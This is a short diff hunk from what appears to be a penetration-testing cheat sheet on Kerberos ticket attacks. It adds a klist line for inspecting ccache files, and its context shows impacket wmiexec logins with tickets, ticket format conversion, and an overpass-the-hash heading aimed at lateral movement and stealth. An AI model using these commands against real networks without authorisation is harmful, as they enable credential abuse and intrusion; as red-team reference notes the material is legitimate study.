@@ -315,6 +315,8 @@ python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 # To convert tickets between Linux/Windows format with ticket_converter.py:
 impacket-ticket_converter ticket.kirbi ticket.ccache
 impacket-ticket_converter ticket.ccache ticket.kirbi
+
+klist -c path_to_ccache_file (determines TGS or TGT)
 ```
 ### Overpass-the-hash (for Kerberos-Only login or users in "Protected Users" group or Double-Hop or for stealth)
 >transfer hash to TGT ticket file, then authenticate as that user to move laterally
